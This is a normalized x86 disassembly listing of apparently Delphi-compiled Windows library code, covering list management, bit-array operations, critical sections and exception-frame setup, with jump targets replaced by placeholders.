pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4167c8
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_41647c
push ebx
push esi
call sub_40710c
mov eax [ eax + 0x8 ]
call sub_403f64
call sub_40710c
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_4168b0
mov esi eax
call sub_40710c
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_4166b4
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_40710c
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_403f64
sub_4164d8
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_41656e
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416575
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_403ef0
call sub_4164d8
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_403e44
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4050a8
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_4064a8
call sub_4064f8
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_416370
or bl al
sub_416580
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41662e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
and ax [ r-xdata ]
movzx edx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_41660f
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_403e3c
call sub_4164d8
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_4163f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416616
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_41644c
retn
call sub_41647c
sub_416648
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_416668
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4166b4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_416754
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
add ecx ecx
add ecx ecx
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_402f9c
mov edx esi
mov eax ebx
call sub_4167c8
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41671c
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_416718
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf0
jmp sub_4047d8
sub_416754
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_41679c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_406fd4
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_41671c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4167a3
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_4167c8
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_416754
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_4167f0
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_416984
retn
sub_416824
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_416844
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_416754
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
add ecx ecx
add ecx ecx
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_402f9c
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4168bc
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp esi edi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_416754
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebx
call sub_4167c8
mov ebp eax
mov eax [ ebx + 0x4 ]
xor edx edx
mov [ eax + edi * 4 ] edx
mov edx edi
mov eax ebx
call sub_4166b4
xor ecx ecx
mov edx esi
mov eax ebx
call sub_416844
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] ebp
sub_416914
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_416754
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_416964
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_416824
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4166b4
sub_416984
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_416754
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
add edx edx
add edx edx
lea eax [ ebx + 0x4 ]
call sub_402d5c
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_4169c0
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_416754
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_416984
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
add eax eax
add eax eax
xor ecx ecx
xchg edx eax
call sub_403728
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_4166b4
dec ebp
inc edi
jne r-xdata
sub_416a38
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403f34
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_416a8c
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_404330
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_416b90
xor eax eax
push ebp
push sub_416aef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_403f64
movzx edx [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403f54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416af6
mov eax [ ebp - 0x4 ]
call sub_416bf4
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_416b08
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_416b90
xor eax eax
push ebp
push sub_416b84
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_416668
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_416824
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416b8b
mov eax [ ebp - 0x4 ]
call sub_416bf4
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_416754
sub_416ba4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_416b90
xor eax eax
push ebp
push sub_416be7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_416964
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416bee
mov eax [ ebp - 0x4 ]
call sub_416bf4
retn
sub_416c00
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_416c54
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403f54
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_416c54
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_416c30
sar eax 0x5
mov edi eax
add edi edi
add edi edi
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
add ebp ebp
add ebp ebp
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_402d28
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_403728
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_402d44
mov edx edi
mov eax ebp
call sub_416c48
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_402f9c
sub_416cf8
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_416c30
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_416c54
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_416d24
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_416d9c
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax esi
call sub_41a48c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403f54
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_416ddc
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_416e92
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404edc
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_403e44
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4050a8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_403e44
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dcac
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416e99
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_416eb8
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_416f4d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_403e44
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_4050a8
mov eax ebx
mov si 0xffff
call sub_404160
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416f54
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov eax ebx
mov si 0xffff
call sub_404160
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_404160
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_4051e4
sub_416f6c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4041b8
mov eax ebx
mov si 0xffff
call sub_404160
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_404160
push eax
lea eax [ ebx + 0x4 ]
call sub_406af4
mov ecx eax
mov edx r-xdata
pop eax
call sub_404018
sub_416faa
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_416fdc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_416ffc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_404018
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_417024
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_406af4
test edi edi
je r-xdata
xor edx edx
mov [ eax ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax edi
mov si 0xffff
call sub_404160
mov ebx eax
test ebx ebx
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_406af4
mov edx eax
mov eax ebx
call sub_417024
test [ edi + 0x1c ] 0x10
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_406af4
push eax
push r-xdata
push edi
mov eax [ edi ]
call [ eax + 0x28 ]
jmp r-xdata
sub_4170c4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_417119
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_406af4
mov edx eax
mov eax edi
call sub_417024
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417120
lea eax [ ebp - 0x4 ]
call sub_406af4
retn
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_417128
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx ecx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_417160
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_416d9c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_417190
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
cmp [ esi + 0xc ] 0x0
jne r-xdata
test dl dl
je r-xdata
mov edx eax
xor edx edx
jmp r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_4171cc
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_403e44
mov edx esp
mov eax esi
call sub_4050a8
add esp 0x100
pop esi
pop ebx
retn
sub_4171f4
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_417289
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x114 ]
mov eax [ ebx ]
call sub_403e44
lea edx [ ebp - 0x114 ]
mov eax edi
call sub_4050a8
push edi
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x4 ]
mov si 0xfffe
call sub_404160
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov eax ebx
call sub_4171b4
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_40ada8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417290
lea eax [ ebp - 0x14 ]
call sub_404e44
retn
sub_4172ac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_41777c
mov edx ebx
mov eax esi
call sub_417714
sub_4172dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4171b4
test eax eax
jl r-xdata
pop esi
pop ebx
retn
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
mov ecx esi
xchg edx eax
call sub_4168bc
mov dl 0x1
mov eax ebx
call sub_417190
sub_41730c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ esi + 0x8 ] eax
xor ecx ecx
mov edx esi
mov eax esi
call sub_4170c4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_417358
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov [ esi + 0xc ] 0x1
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov cl 0x1
mov edx esi
mov eax esi
call sub_4170c4
mov eax [ esi + 0x8 ]
call sub_403f64
mov edx ebx
and dl 0xfc
mov eax esi
call sub_416d9c
test bl bl
jle r-xdata
mov eax esi
call sub_417470
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_4173a4
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_4173c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_416dc8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_417442
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_417470
mov eax esi
call sub_417514
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
inc ebx
xor edi edi
mov edx edi
mov eax esi
call sub_41751c
push eax
mov eax [ ebp - 0x4 ]
call sub_4173a4
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc edi
dec ebx
jne r-xdata
sub_417470
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_4174ca
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_4168b0
call sub_403f64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_4174f4
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41751c
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_417530
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4175de
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebx ]
call sub_403e44
lea edx [ ebp - 0x108 ]
mov eax edi
call sub_4050a8
mov eax ebx
mov si 0xffff
call sub_404160
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4175e5
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
mov eax ebx
mov si 0xffff
call sub_404160
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_404160
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4175f8
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x8 ]
mov eax edi
mov edx 0x3
call sub_4051e4
sub_4175f8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
call sub_404e98
mov eax [ ebp - 0x4 ]
mov si 0xffff
call sub_404160
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4041a4
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4041a4
call sub_413128
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
movsx eax [ ebx + 0x8 ]
add eax eax
add eax eax
call sub_402d28
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4176f6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4041a4
mov edx [ ebp - 0xc ]
call sub_413254
movsx edi [ ebx + 0x8 ]
dec edi
test edi edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_402d44
retn
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + ebx * 4 ]
mov eax [ ebp - 0x10 ]
call sub_4132a8
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov esi [ eax + ebx * 4 ]
mov eax [ esi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x14
lea edx [ esi + 0x1a ]
call sub_4050a8
